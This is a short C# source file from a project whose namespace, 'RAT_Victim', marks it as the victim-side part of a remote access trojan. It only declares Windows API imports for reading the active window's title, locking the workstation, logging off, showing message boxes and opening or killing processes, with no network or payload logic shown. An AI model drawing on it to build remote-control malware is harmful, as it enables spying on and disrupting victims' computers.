using System.Runtime.InteropServices;
using System.Text;

namespace RAT_Victim
{
    class WinAPI
    {
        private const string user = "user32";
        private const string kernel = "kernel32";

        [DllImport(user)]
        public static extern uint GetForegroundWindow();

        [DllImport(user)]
        public static extern bool LockWorkStation();

        [DllImport(user)]
        public static extern uint GetWindowThreadProcessId(uint hWnd, out uint lpdwProcessId);

        [DllImport(user)]
        public static extern bool ExitWindowsEx(uint uFlags, uint dwReason);

        [DllImport(user)]
        public static extern int MessageBox(uint hWnd, string lpText, string lpCaption, uint uType);

        [DllImport(user)]
        public static extern int GetWindowText(uint hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport(kernel)]
        public static extern uint GetLastError();

        [DllImport(kernel)]
        public static extern bool TerminateProcess(uint hProcess, int uExitCode);

        [DllImport(kernel)]
        public static extern uint OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    }
}
